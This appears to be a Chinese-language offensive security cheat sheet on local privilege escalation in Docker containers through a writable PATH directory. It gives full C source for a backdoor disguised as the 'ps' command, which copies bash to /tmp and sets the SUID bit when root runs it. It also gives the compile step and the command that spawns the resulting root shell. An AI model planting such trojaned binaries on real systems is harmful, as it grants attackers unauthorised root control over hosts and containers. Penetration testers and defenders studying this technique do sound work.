# Docker Attack Surface - 容器攻击面

## 本地提权

### 环境变量目录可写

- 使用linpeas.sh查看是否存在当前用户可写的环境变量目录

![path](../images/Cloud/Docker/path-info-1.png)

- 创建一个后门，后门名称可以为linux常用命令

```shell
nano ps.c
```

- 编写后门代码

```c
#include<stdlib.h>
void main()
{
	system("cp /bin/bash /tmp/guest/shell;chmod u+s /tmp/guest/shell;/usr/bin/ps");
}
```

- 编译c文件

```shell
gcc ps.c -o ps
```

- 等待root用户执行ps命令，即可获取suid shell

```shell
./shell -p
```

![path](../images/Cloud/Docker/path-att-1.png)
